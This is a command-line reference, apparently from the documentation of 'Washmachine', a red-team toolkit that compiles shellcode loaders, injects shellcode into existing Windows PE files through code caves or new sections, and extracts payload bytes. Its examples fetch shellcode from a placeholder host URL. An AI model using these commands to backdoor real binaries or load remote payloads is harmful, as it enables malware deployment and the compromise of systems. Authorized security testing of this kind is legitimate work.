---
outline: deep
---

# CLI Reference

```text
washmachine-cli <command> [options]
```

Public CLI contract for Washmachine. Command names, required arguments, and options listed here are intended for scripting and repeatable automation.

::: tip Global Behavior
- **Parser style:** `washmachine-cli <command> [options]`
- **Exit model:** non-zero on argument, runtime, or processing failure
- **Output model:** human-readable text by default; selected commands support `--json`
- **Verbosity:** `--verbose` on supported commands increases diagnostic output
- **Catalog dependency:** template/snippet/encoder/envelope selection depends on runtime YAML assets
- **Compiler dependency:** `compile` requires at least one discoverable C++ toolchain
- **Provisioning:** encoding/envelope features may require `provision` when external tools are absent
:::

## Command Index

| Command | Description |
|---|---|
| [`compile`](#compile) | Build a shellcode loader executable |
| [`analyze`](#analyze) | Analyze a PE file (headers, sections, imports, code caves) |
| [`strip`](#strip) | Extract executable bytes to `.bin` payloads |
| [`backdoor`](#backdoor) | Inject shellcode into an existing PE file |
| [`list`](#list) | List templates, encoders, snippets, or compilers |
| [`provision`](#provision) | Download/install required external tools (Bin2Shell) |
| [`test`](#test) | Run the automated test harness |

## `compile`

Usage:

```text
washmachine-cli compile --shellcode <file> [options]
```

Required input (choose one):

- `--shellcode, -s <file>`
- `--shellcode-hex <hex>`
- `--shellcode-url, -u <url>`

Options:

- `--template, -t <id>`: template identifier from catalog (default: `shellcode-minimal`)
- `--encoder, -e <index>`: encoder index used for payload transformation
- `--envelope, -v <index>`: envelope index used for printable/text representation
- `--snippet <key=value>`: override or inject snippet key/value pairs (repeatable)
- `--verbose`: emit additional runtime diagnostics
- `--json`: emit machine-readable output

Processing stages:

1. Validate source input and parse selected command options.
2. Load template/snippet/algorithm catalog metadata.
3. Resolve shellcode source bytes from file, inline hex, or URL.
4. Apply optional encoder/envelope steps (Bin2Shell-assisted where configured).
5. Render C++ source with resolved placeholders and snippet values.
6. Detect an available compiler and invoke build.
7. Write output artifacts and session diagnostics.

Examples:

```powershell
washmachine-cli compile -s payload.bin
washmachine-cli compile --shellcode-hex FC4883E4F0... -e 1
washmachine-cli compile -u http://host/shell.bin --verbose
```

## `analyze`

Usage:

```text
washmachine-cli analyze <pe-file> [--json]
```

Behavior:

- Parses PE headers and sections
- Enumerates imports and code caves where applicable
- Supports JSON output for downstream automation

## `strip`

Usage:

```text
washmachine-cli strip <pe-file> [options]
```

Options:

- `-o, --output <file>`: target path for extracted payload bytes
- `-m, --mode <mode>`: extraction mode (`ep | section | all-exec | range`)
- `--section <name>`: section selector for `section` mode
- `--range <start:len>`: explicit byte range for `range` mode
- `--no-trim`: disable post-extraction trimming
- `--analyze`: include/trigger analysis context alongside extraction

## `backdoor`

Usage:

```text
washmachine-cli backdoor --pe <file> --shellcode <file> [options]
```

Options:

- `--output, -o <file>`: write destination for modified PE
- `--method, -m <method>`: injection strategy (`code-cave | new-section | section-ext`)
- `--encryption, --enc <enc>`: reserved option for future encryption modes
- `--xor-key <byte>`: byte key for XOR flow where enabled
- `--carrier, --invoke <mode>`: execution carrier/invocation strategy selector
- `--section-name <name>`: target or new section naming override
- `--no-remove-sig`: retain existing PE signature metadata
- `--no-patch-subsystem`: skip subsystem patching stage
- `--no-preserve-entry`: reserved option
- `--no-patch-iat`: reserved option
- `--no-patch-exit`: skip exit patch stage
- `--cave-min-size <n>`: minimum code-cave size for cave strategy
- `--dry-run`: evaluate strategy without writing modified output
- `--verbose`: emit extended diagnostics
- `--json`: emit machine-readable output

## `list`

Usage:

```text
washmachine-cli list <target>
```

Targets:

- `--templates`
- `--encoders`
- `--snippets`
- `--compilers`

Behavior:

- Enumerates runtime metadata used by generation workflows
- Useful for validating catalog availability and toolchain detection

## `provision`

Usage:

```text
washmachine-cli provision
```

Behavior:

- Installs or updates required auxiliary dependencies
- Primarily used to set up Bin2Shell integration paths

## `test`

Usage:

```text
washmachine-cli test [options]
```

Behavior:

- Executes the automated harness across configured test phases
- Produces result summaries for compile/runtime compatibility checks
- Writes output summary to `test_results.json`

Examples:

```powershell
washmachine-cli test --shellcode messagebox.bin --phase all
washmachine-cli test --shellcode messagebox.bin --phase 1 --url http://host/payload.bin
washmachine-cli test --phase 3 --test-assets "testing assets\\binary\\shellcodes"
```

::: warning ⚠️ Security Notice
This toolkit is intended **exclusively** for educational and authorized security testing purposes.
:::
